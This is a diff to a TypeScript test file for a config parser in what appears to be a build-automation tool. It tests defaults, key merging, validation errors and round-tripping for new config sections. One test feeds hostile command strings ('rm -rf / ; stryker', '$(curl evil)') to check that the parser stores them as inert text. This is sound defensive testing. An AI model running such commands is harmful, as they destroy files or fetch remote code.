@@ -1,6 +1,11 @@
+import { readFileSync } from "node:fs";
+import { dirname, join } from "node:path";
+import { fileURLToPath } from "node:url";
+
+import { CONSUMED_FROM, FACTORY_DEFAULTS, factoryConfigOf } from "@hardness/contracts";
 import { describe, expect, it } from "vitest";
 
-import { DEFAULT_POLICY } from "./policy.ts";
+import { DEFAULT_POLICY, PolicyParseError } from "./policy.ts";
 import { parseLunaConfig, renderLunaConfig, validateLunaConfig } from "./luna-config.ts";
 
 const full = `
@@ -80,6 +85,7 @@ describe("parseLunaConfig", () => {
       evidenceRetentionDays: 30,
       autoMerge: "off",
       freeze: [{ from: "2026-12-24T00:00:00Z", to: "2026-12-27T00:00:00Z", reason: "holiday freeze" }],
+      factory: factoryConfigOf({ evidence: { retention_days: 30 } }),
     });
   });
 
@@ -243,5 +249,67 @@ sla:
     expect(() => parseLunaConfig("sla:\n  gate: soon\n")).toThrow(/sla\.gate/);
     expect(() => parseLunaConfig("jira:\n  comments: loud\n")).toThrow(/jira\.comments/);
     expect(() => parseLunaConfig("jira:\n  intake: { jql: 'x', every: 5 }\n")).toThrow(/jira\.intake\.every/);
+  });
+});
+
+describe("the v2.2 diagram's sections", () => {
+  it("are the diagram's defaults for a file that has none, and for an empty file", () => {
+    expect(parseLunaConfig("policy:\n  qa: web\n").factory).toEqual(FACTORY_DEFAULTS);
+    expect(parseLunaConfig("").factory).toEqual(FACTORY_DEFAULTS);
+  });
+
+  it("merge a repo's values over the defaults, key by key", () => {
+    const policy = parseLunaConfig("plan:\n  coverage_rounds: 5\n  approvers:\n    high: 3\nship:\n  stale_days: 30\n  merge:\n    method: rebase\n");
+    expect(policy.factory.plan).toMatchObject({ coverage_rounds: 5, plan_check_retries: 2, approvers: { low: 1, medium: 1, high: 3 } });
+    expect(policy.factory.ship).toMatchObject({ stale_days: 30, merge: { method: "rebase", queue: true } });
+  });
+
+  it("name the key of a wrong type, an out-of-range number or an unknown key", () => {
+    expect(() => parseLunaConfig("dedup:\n  duplicate: 2\n")).toThrow(/dedup\.duplicate/);
+    expect(() => parseLunaConfig("plan:\n  coverage_rounds: many\n")).toThrow(/plan\.coverage_rounds/);
+    expect(() => parseLunaConfig("build:\n  max_minutes: 0\n")).toThrow(/build\.max_minutes/);
+    expect(() => parseLunaConfig("triage:\n  confidence:\n    mood: 1\n")).toThrow(/mood/);
+    expect(() => parseLunaConfig("ship:\n  nope: 1\n")).toThrow(/nope/);
+    expect(() => parseLunaConfig("ship:\n  nope: 1\n")).toThrow(PolicyParseError);
+  });
+
+  it("store the command and template strings as opaque text: nothing runs or renders them", () => {
+    const policy = parseLunaConfig('verify:\n  mutation:\n    command: "rm -rf / ; stryker"\n  e2e:\n    deploy:\n      command: "$(curl evil)"\n    start:\n      command: "npm start"\nship:\n  merge:\n    commit_template: "{{secret}}"\n');
+    expect(policy.factory.verify.mutation.command).toBe("rm -rf / ; stryker");
+    expect(policy.factory.verify.e2e.deploy.command).toBe("$(curl evil)");
+    expect(policy.factory.verify.e2e.start.command).toBe("npm start");
+    expect(policy.factory.ship.merge.commit_template).toBe("{{secret}}");
+  });
+
+  it("leave the existing keys meaning what they did, and win over the new forms", () => {
+    const policy = parseLunaConfig("policy:\n  auto_merge: low\nevidence:\n  retention_days: 7\nsla:\n  cycle: 3d\nship:\n  auto_merge: medium\n");
+    expect(policy.autoMerge).toBe("low");
+    expect(policy.evidenceRetentionDays).toBe(7);
+    expect(policy.sla.cycle).toBe(3 * 86_400);
+    // the new form is defined and not wired: today's behaviour does not read it
+    expect(policy.factory.ship.auto_merge).toBe("medium");
+    expect(parseLunaConfig("ship:\n  preview: off\n").autoMerge).toBe("off");
+  });
+
+  it("render back into a file the parser reads to the same sections", () => {
+    const config = validateLunaConfig({ plan: { coverage_rounds: 4 }, ship: { stale_days: 21 } });
+    expect(parseLunaConfig(renderLunaConfig(config)).factory.plan.coverage_rounds).toBe(4);
+    expect(parseLunaConfig(renderLunaConfig(config)).factory.ship.stale_days).toBe(21);
+  });
+
+  it("are read by code for every key marked wave 8, and by the values' consumers only", () => {
+    const here = dirname(fileURLToPath(import.meta.url));
+    const sources = ["../application/stages/plan.ts", "../application/stages/ship-monitor.ts", "../application/stages/e2e.ts"].map((f) => readFileSync(join(here, f), "utf8")).join("\n");
+    const read: Record<string, RegExp> = {
+      "plan.coverage_rounds": /coverage_rounds/,
+      "plan.plan_check_retries": /plan_check_retries/,
+      "ship.stale_days": /factory\.ship\.stale_days/,
+      "verify.env_flake_retries": /env_flake_retries/,
+      "verify.ci_flaky_reruns": /factory\.verify\.ci_flaky_reruns/,
+      "verify.auto_rebase": /factory\.verify\.auto_rebase/,
+    };
+    const wave8 = Object.entries(CONSUMED_FROM).filter(([, w]) => w === 8).map(([k]) => k);
+    expect(Object.keys(read).sort()).toEqual(wave8.sort());
+    for (const key of wave8) expect(sources).toMatch(read[key]!);
   });
 });
